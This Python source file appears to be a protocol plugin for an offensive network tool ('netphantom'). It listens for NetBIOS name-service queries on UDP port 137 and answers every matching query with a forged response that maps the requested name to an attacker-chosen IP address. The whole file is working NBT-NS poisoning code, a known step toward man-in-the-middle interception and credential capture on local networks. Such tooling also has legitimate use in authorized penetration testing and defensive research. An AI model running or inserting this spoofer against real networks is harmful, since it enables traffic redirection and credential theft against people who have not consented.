import asyncio
from typing import Any, Dict
from scapy.all import *
from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse, NBNSResourceRecord
from netphantom.core.interfaces import ProtocolPlugin
from netphantom.utils.logger import logger

class NBNSPlugin(ProtocolPlugin):
    @property
    def name(self) -> str:
        return "nbt_ns"

    async def setup(self, config: Dict[str, Any]) -> None:
        self.interface = config.get("interface", "eth0")
        self.spoof_ip = config.get("spoof_ip", "127.0.0.1")
        self.running = False

    async def start(self) -> None:
        self.running = True
        asyncio.create_task(self._run())

    async def stop(self) -> None:
        self.running = False
        logger.info("[NBT-NS] Plugin stopped.")

    async def _run(self) -> None:
        logger.info(f"[NBT-NS] Starting discovery on {self.interface}")
        def stop_filter(p: Packet) -> bool:
            return not self.running

        loop = asyncio.get_event_loop()
        await loop.run_in_executor(None, self._sniff_blocking, stop_filter)

    def _sniff_blocking(self, stop_filter: Any) -> None:
        sniff(
            iface=self.interface, 
            filter="udp port 137", 
            prn=self._handle_packet, 
            store=0, 
            stop_filter=stop_filter
        )

    def _handle_packet(self, packet: Packet) -> None:
        if NBNSQueryRequest in packet and packet[NBNSQueryRequest].FLAGS == 0x0110:
            query_name = packet[NBNSQueryRequest].QUESTION_NAME.decode(errors='ignore').rstrip()
            source_ip = packet[IP].src if IP in packet else "Unknown"
            
            logger.info(f"[NBT-NS] Intercepted query for {query_name} from {source_ip}")
            
            if IP in packet and UDP in packet:
                resp = IP(dst=packet[IP].src, src=self.spoof_ip) / \
                       UDP(dport=packet[UDP].sport, sport=137) / \
                       NBNSQueryResponse(
                           NAME_TRN_ID=packet[NBNSQueryRequest].NAME_TRN_ID,
                           FLAGS=0x8500,
                           QDCOUNT=0,
                           ANCOUNT=1,
                           ADDR_ENTRY=[NBNSResourceRecord(
                               RR_NAME=packet[NBNSQueryRequest].QUESTION_NAME,
                               SUFFIX=packet[NBNSQueryRequest].SUFFIX,
                               ADDR=self.spoof_ip
                           )]
                       )
                
                send(resp, iface=self.interface, verbose=False)
                logger.info(f"[NBT-NS] Spoofed response sent to {packet[IP].src}")

